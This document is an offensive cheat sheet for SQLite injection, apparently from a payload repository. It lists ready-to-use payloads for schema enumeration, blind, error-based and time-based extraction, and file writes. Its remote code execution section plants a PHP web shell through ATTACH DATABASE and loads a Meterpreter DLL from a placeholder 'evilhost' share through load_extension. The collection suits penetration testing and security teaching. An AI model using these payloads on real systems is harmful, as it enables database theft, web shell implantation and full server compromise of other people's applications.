# SQLite Injection

> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert or "inject" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues. 


## Summary

* [SQLite Comments](#sqlite-comments)
* [SQLite Enumeration](#sqlite-enumeration)
* [SQLite String](#sqlite-string)
    * [SQLite String Methodology](#sqlite-string-methodology)
* [SQLite Blind](#sqlite-blind)
    * [SQLite Blind Methodology](#sqlite-blind-methodology)
    * [SQLite Blind With Substring Equivalent](#sqlite-blind-with-substring-equivalent)
* [SQlite Error Based](#sqlite-error-based)
* [SQlite Time Based](#sqlite-time-based)
* [SQlite Remote Code Execution](#sqlite-remote-code-execution)
    * [Attach Database](#attach-database)
    * [Load_extension](#load_extension)
* [SQLite File Manipulation](#SQLite-file-manipulation)
    * [SQLite Read File](#SQLite-read-file)
    * [SQLite Write File](#SQLite-write-file)
* [References](#references)


## SQLite Comments

| Description         | Comment |
| ------------------- | ------- |
| Single-Line Comment | `--`    |
| Multi-Line Comment  | `/**/`  |


## SQLite Enumeration

| Description   | SQL Query |
| ------------- | ----------------------------------------- |
| DBMS version  | `select sqlite_version();`                |


## SQLite String

### SQLite String Methodology

| Description             | SQL Query                                 |
| ----------------------- | ----------------------------------------- | 
| Extract Database Structure                           | `SELECT sql FROM sqlite_schema` |
| Extract Database Structure (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master` |
| Extract Table Name  | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |
| Extract Table Name  | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
| Extract Column Name | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'` |
| Extract Column Name | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');` |
| Extract Column Name | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |
| Extract Column Name | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |


## SQLite Blind

### SQLite Blind Methodology

| Description             | SQL Query                                 |
| ----------------------- | ----------------------------------------- | 
| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table` | 
| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number` | 
| Extract Info            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')` | 
| Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` | 


### SQLite Blind With Substring Equivalent

| Function    | Example                                   |
| ----------- | ----------------------------------------- | 
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`  | 
| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     | 


## SQlite Error Based

```sql
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
```


## SQlite Time Based

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```


## SQLite Remote Code Execution

### Attach Database

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

### Load_extension

:warning: This component is disabled by default.

```sql
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```


## SQLite File Manipulation

### SQLite Read File

SQLite does not support file I/O operations by default.


### SQLite Write File

```sql
SELECT writefile('/path/to/file', column_name) FROM table_name
```


## References

* [Injecting SQLite database based application - Manish Kishan Tanwar - February 14, 2017](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
* [SQLite Error Based Injection for Enumeration - Rio Asmara Suryadi - February 6, 2021](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
* [SQLite3 Injection Cheat sheet - Nickosaurus Hax - May 31, 2012](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
